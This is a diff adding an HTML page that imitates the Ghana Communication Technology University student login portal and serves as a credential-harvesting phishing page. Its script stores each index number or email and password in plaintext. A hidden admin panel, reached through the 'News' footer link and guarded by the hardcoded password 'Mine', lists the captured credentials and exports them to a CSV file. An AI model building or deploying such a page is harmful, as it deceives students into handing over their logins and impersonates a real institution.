@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- htmlaunch:enhanced:v2 -->
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml;utf8,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2264%22%20height%3D%2264%22%20viewBox%3D%220%200%2064%2064%22%3E%3Cdefs%3E%3ClinearGradient%20id%3D%22g%22%20x1%3D%220%22%20y1%3D%220%22%20x2%3D%221%22%20y2%3D%221%22%3E%3Cstop%20offset%3D%220%25%22%20stop-color%3D%22hsl(188%2C72%25%2C58%25)%22%2F%3E%3Cstop%20offset%3D%22100%25%22%20stop-color%3D%22hsl(218%2C72%25%2C44%25)%22%2F%3E%3C%2FlinearGradient%3E%3C%2Fdefs%3E%3Crect%20width%3D%2264%22%20height%3D%2264%22%20rx%3D%2214%22%20fill%3D%22url(%23g)%22%2F%3E%3Ctext%20x%3D%2232%22%20y%3D%2246%22%20text-anchor%3D%22middle%22%20font-family%3D%22ui-sans-serif%2Csystem-ui%2C-apple-system%2CSegoe%20UI%2Csans-serif%22%20font-size%3D%2238%22%20font-weight%3D%22800%22%20fill%3D%22%23ffffff%22%3EG%3C%2Ftext%3E%3C%2Fsvg%3E">
+<meta name="theme-color" content="#2e7b14">
+<meta name="description" content="GCTU Student Portal | deployed with HTMLaunch">
+<link rel="canonical" href="https://KMilank.github.io/gctu-projects-portal/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="GCTU Student Portal">
+<meta property="og:title" content="GCTU Student Portal">
+<meta property="og:description" content="GCTU Student Portal | deployed with HTMLaunch">
+<meta property="og:url" content="https://KMilank.github.io/gctu-projects-portal/">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://KMilank.github.io/gctu-projects-portal/gctu-logo.png">
+<meta property="og:image:alt" content="GCTU Student Portal">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="GCTU Student Portal">
+<meta name="twitter:description" content="GCTU Student Portal | deployed with HTMLaunch">
+<meta name="twitter:image" content="https://KMilank.github.io/gctu-projects-portal/gctu-logo.png">
+<meta name="twitter:image:alt" content="GCTU Student Portal">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GCTU Student Portal</title>
+    <style>
+        /* --- CSS STYLES --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f4f5f7;
+            color: #333;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* --- ADMIN OVERLAY STYLES --- */
+        #admin-overlay {
+            display: none; 
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            z-index: 10000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .admin-box {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            width: 100%;
+            max-width: 700px; /* Made slightly wider for data */
+            max-height: 90vh;
+            overflow-y: auto;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+
+        .admin-box h2 {
+            color: #10154a;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .admin-section {
+            margin-bottom: 25px;
+        }
+
+        .admin-section h3 {
+            font-size: 1.1rem;
+            color: #333;
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: #eef0ff;
+            padding: 10px;
+            border-radius: 5px;
+        }
+
+        .log-list {
+            background: #f9f9f9;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            padding: 10px;
+            list-style: none;
+            font-family: monospace;
+            font-size: 0.9rem;
+            max-height: 250px; /* Scrollable for many students */
+            overflow-y: auto;
+        }
+
+        .log-list li {
+            padding: 8px;
+            border-bottom: 1px solid #eee;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .log-list li:nth-child(even) {
+            background-color: #f4f4f4;
+        }
+
+        .log-list li:last-child {
+            border-bottom: none;
+        }
+
+        .time-stamp {
+            color: #888;
+            font-size: 0.8rem;
+        }
+
+        .btn-small {
+            background: #1a237e;
+            color: white;
+            border: none;
+            padding: 6px 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .btn-small:hover { background: #10154a; }
+
+        .btn-danger {
+            background: #e91e63;
+        }
+        .btn-danger:hover { background: #c2185b; }
+
+        .admin-actions {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
+        .close-admin {
+            flex: 1;
+            background: #555;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        /* --- REST OF THE PORTAL STYLES --- */
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 20px 40px;
+            background-color: #fff;
+            border-bottom: 1px solid #eee;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            margin-right: 15px;
+            object-fit: contain;
+        }
+
+        .header-text h1 {
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #1a1a1a;
+            line-height: 1.4;
+        }
+
+        .main-container {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+
+        .portal-card {
+            background: #f0f2f8;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
+        }
+
+        h2.portal-title {
+            font-size: 2rem;
+            color: #0b1c4d;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .welcome-text {
+            color: #666;
+            font-size: 0.95rem;
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .browser-notice {
+            color: #e91e63;
+            font-size: 0.9rem;
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+
+        .form-box {
+            background: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 40px 12px 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 1rem;
+            color: #333;
+            outline: none;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #666;
+            font-size: 1.2rem;
+            cursor: pointer;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-group input {
+            margin-right: 8px;
+            transform: scale(1.2);
+            accent-color: #1a237e;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #10154a;
+            color: white;
+            padding: 14px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .login-btn:hover { background-color: #1a237e; }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #e57373;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .footer {
+            background: #fff;
+            padding: 40px 20px;
+            border-top: 1px solid #ddd;
+            text-align: left;
+            padding-left: 10%;
+        }
+
+        .footer-logo {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            margin-bottom: 10px;
+        }
+
+        .copyright {
+            font-size: 0.8rem;
+            color: #888;
+            margin-bottom: 30px;
+        }
+
+        .footer-links {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .footer-links li a {
+            text-decoration: none;
+            color: #555;
+            font-weight: 500;
+            font-size: 0.95rem;
+            cursor: pointer;
+        }
+
+        .footer-links li a:hover { color: #1a237e; }
+
+        #dashboard-section {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .upload-container { text-align: center; }
+        
+        .upload-area {
+            border: 2px dashed #1a237e;
+            background: #f9f9ff;
+            padding: 40px;
+            border-radius: 10px;
+            margin: 20px 0;
+            cursor: pointer;
+        }
+
+        .upload-area:hover { background: #eef0ff; }
+
+        .upload-icon {
+            font-size: 3rem;
+            color: #1a237e;
+            margin-bottom: 10px;
+        }
+
+        .file-input { display: none; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @media (max-width: 600px) {
+            .header { padding: 15px; }
+            .header-text h1 { font-size: 0.9rem; }
+            .portal-card { padding: 20px; }
+            .footer { padding-left: 20px; }
+            .admin-box h2 { font-size: 1.2rem; }
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+</head>
+<body>
+
+    <!-- ADMIN OVERLAY -->
+    <div id="admin-overlay">
+        <div class="admin-box">
+            <h2>
+                <span><i class="fa-solid fa-shield-halved"></i> Admin Dashboard</span>
+                <span style="font-size: 0.9rem; color: #666;" id="record-count">0 Records</span>
+            </h2>
+            
+            <div class="admin-section">
+                <h3>
+                    Login Attempts 
+                    <button class="btn-small" onclick="downloadExcelReport()"><i class="fa-solid fa-file-excel"></i> Download Excel</button>
+                </h3>
+                <ul id="admin-login-list" class="log-list">
+                    <li style="color:#888; justify-content: center;">No login attempts yet...</li>
+                </ul>
+            </div>
+
+            <div class="admin-section">
+                <h3>Uploaded Documents</h3>
+                <ul id="admin-upload-list" class="log-list">
+                    <li style="color:#888; justify-content: center;">No documents uploaded yet...</li>
+                </ul>
+            </div>
+
+            <div class="admin-actions">
+                <button class="close-admin" onclick="toggleAdminView()">Close Panel</button>
+                <button class="close-admin btn-danger" onclick="clearAllData()"><i class="fa-solid fa-trash"></i> Clear Data</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header -->
+    <header class="header">
+        <img src="gctu-logo.png" alt="GCTU Logo" class="logo">
+        <div class="header-text">
+            <h1>Ghana Communication<br>Technology University (GCTU)</h1>
+        </div>
+    </header>
+
+    <main class="main-container">
+        
+        <!-- Login Section -->
+        <div class="portal-card" id="login-section">
+            <h2 class="portal-title">Student Portal</h2>
+            <p class="welcome-text">
+                Welcome to the official student portal for Ghana Communication Technology University (GCTU)
+            </p>
+            <p class="browser-notice">
+                Kindly open in Chrome browser for best platform experience.
+            </p>
+
+            <div class="form-box">
+                <form id="loginForm" onsubmit="handleLogin(event)">
+                    <div class="input-group">
+                        <input type="text" id="indexNumber" placeholder="Index Number Or Email" required>
+                        <i class="fa-regular fa-user input-icon"></i>
+                    </div>
+
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder="Password" required>
+                        <i class="fa-regular fa-eye input-icon" onclick="togglePassword()"></i>
+                    </div>
+
+                    <div class="checkbox-group">
+                        <input type="checkbox" id="remember">
+                        <label for="remember">Remember Me</label>
+                    </div>
+
+                    <button type="submit" class="login-btn">Login</button>
+                </form>
+                <a href="#" class="forgot-link">Forgot your password? Click here to do a password reset.</a>
+            </div>
+        </div>
+
+        <!-- Dashboard Section -->
+        <div class="portal-card" id="dashboard-section">
+            <h2 class="portal-title">Project Submission</h2>
+            <p class="welcome-text">Welcome, Student. Please upload your final project work below.</p>
+            
+            <div class="form-box upload-container">
+                <div class="upload-area" onclick="document.getElementById('fileInput').click()">
+                    <i class="fa-solid fa-cloud-arrow-up upload-icon"></i>
+                    <p>Click to browse or drag file here</p>
+                    <p style="font-size: 0.8rem; color: #888; margin-top: 5px;">(PDF or DOCX only)</p>
+                </div>
+                <!-- Added accept attribute to restrict files -->
+                <input type="file" id="fileInput" class="file-input" accept=".pdf,.doc,.docx" onchange="showFileName()">
+                <p id="fileNameDisplay" style="margin-bottom: 15px; font-weight: bold; color: #1a237e;"></p>
+                
+                <button class="login-btn" onclick="uploadProject()">Submit Project</button>
+                <button onclick="logout()" style="background:none; border:none; color: #e91e63; margin-top: 15px; cursor: pointer; text-decoration: underline;">Logout</button>
+            </div>
+        </div>
+
+    </main>
+
+    <footer class="footer">
+        <img src="gctu-logo.png" alt="GCTU Logo" class="footer-logo">
+        <p class="copyright">
+            2023 All Rights Reserved. Ghana Communication Technology University (GCTU)
+        </p>
+        <ul class="footer-links">
+            <li><a href="#">GCTU Online</a></li>
+            <li><a href="#">Learning Platform</a></li>
+            <li><a href="#">Library</a></li>
+            <li><a onclick="requestAdminAccess()">News</a></li>
+            <li><a href="#">Programmes</a></li>
+        </ul>
+    </footer>
+
+    <!-- --- JAVASCRIPT --- -->
+    <script>
+        const ADMIN_PASSWORD = "Mine"; 
+        let loginLogs = [];
+        let uploadLogs = [];
+
+        // Helper to get current time
+        function getTime() {
+            const now = new Date();
+            return now.toLocaleTimeString() + " | " + now.toLocaleDateString();
+        }
+
+        // 1. Request Admin Access
+        function requestAdminAccess() {
+            const enteredPass = prompt("Please enter Admin Password to access system records:");
+            if (enteredPass === null) return; 
+            
+            if (enteredPass === ADMIN_PASSWORD) {
+                openAdminView();
+            } else {
+                alert("Access Denied. Incorrect Password.");
+            }
+        }
+
+        // 2. Open Admin View
+        function openAdminView() {
+            const overlay = document.getElementById('admin-overlay');
+            const loginList = document.getElementById('admin-login-list');
+            const uploadList = document.getElementById('admin-upload-list');
+            const recordCount = document.getElementById('record-count');
+
+            recordCount.innerText = loginLogs.length + " Logins | " + uploadLogs.length + " Uploads";
+
+            if (loginLogs.length === 0) {
+                loginList.innerHTML = '<li style="color:#888; justify-content: center;">No login attempts yet...</li>';
+            } else {
+                loginList.innerHTML = loginLogs.map(log => `
+                    <li>
+                        <span><strong>ID:</strong> ${log.id} | <strong>Pass:</strong> ${log.pass}</span>
+                        <span class="time-stamp">${log.time}</span>
+                    </li>
+                `).join('');
+            }
+
+            if (uploadLogs.length === 0) {
+                uploadList.innerHTML = '<li style="color:#888; justify-content: center;">No documents uploaded yet...</li>';
+            } else {
+                uploadList.innerHTML = uploadLogs.map(file => `
+                    <li>
+                        <span><i class="fa-solid fa-file-pdf" style="color:#e91e63;"></i> ${file.name}</span>
+                        <span class="time-stamp">${file.time}</span>
+                    </li>
+                `).join('');
+            }
+
+            overlay.style.display = 'flex';
+        }
+
+        function toggleAdminView() {
+            document.getElementById('admin-overlay').style.display = 'none';
+        }
+
+        // 3. Toggle Password
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const icon = document.querySelector('.fa-eye');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                icon.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
+        // 4. Handle Login
+        function handleLogin(event) {
+            event.preventDefault(); 
+            const index = document.getElementById('indexNumber').value;
+            const pass = document.getElementById('password').value;
+
+            if (index && pass) {
+                // Save with timestamp
+                loginLogs.push({ id: index, pass: pass, time: getTime() });
+
+                const btn = document.querySelector('.login-btn');
+                btn.innerText = "Authenticating...";
+                btn.disabled = true;
+
+                setTimeout(() => {
+                    document.getElementById('login-section').style.display = 'none';
+                    document.getElementById('dashboard-section').style.display = 'block';
+                    btn.innerText = "Login";
+                    btn.disabled = false;
+                }, 600); 
+            }
+        }
+
+        // 5. Handle File Select
+        function showFileName() {
+            const input = document.getElementById('fileInput');
+            const display = document.getElementById('fileNameDisplay');
+            if (input.files.length > 0) {
+                display.innerText = "Selected: " + input.files[0].name;
+            }
+        }
+
+        // 6. Handle Upload
+        function uploadProject() {
+            const input = document.getElementById('fileInput');
+            if (input.files.length === 0) {
+                alert("Please select a file to upload first.");
+            } else {
+                // Save with timestamp
+                uploadLogs.push({ name: input.files[0].name, time: getTime() });
+                alert("Project Work Uploaded Successfully!");
+                input.value = "";
+                document.getElementById('fileNameDisplay').innerText = "";
+            }
+        }
+
+        function logout() {
+            document.getElementById('dashboard-section').style.display = 'none';
+            document.getElementById('login-section').style.display = 'block';
+            document.getElementById('loginForm').reset();
+            document.getElementById('fileNameDisplay').innerText = "";
+        }
+
+        // 7. Download Excel Report
+        function downloadExcelReport() {
+            if (loginLogs.length === 0 && uploadLogs.length === 0) {
+                alert("No data collected yet to download!");
+                return;
+            }
+
+            let csvContent = "data:text/csv;charset=utf-8,";
+            csvContent += "Type,Index/Email,Password,Uploaded File,Timestamp\r\n";
+
+            loginLogs.forEach(function(log) {
+                csvContent += `Login,${log.id},${log.pass},,${log.time}\r\n`;
+            });
+
+            uploadLogs.forEach(function(file) {
+                csvContent += `Upload,N/A,N/A,${file.name},${file.time}\r\n`;
+            });
+
+            const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
+            
+            const link = document.createElement("a");
+            const url = URL.createObjectURL(blob);
+            link.setAttribute("href", url);
+            link.setAttribute("download", "GCTU_Student_Data_Report.csv");
+            link.style.visibility = 'hidden';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        // 8. Clear Data (Admin only)
+        function clearAllData() {
+            if (confirm("Are you sure you want to delete all student records? This cannot be undone.")) {
+                loginLogs = [];
+                uploadLogs = [];
+                openAdminView(); // Refresh the view
+                alert("All data cleared.");
+            }
+        }
+    </script>
+</body>
+</html>
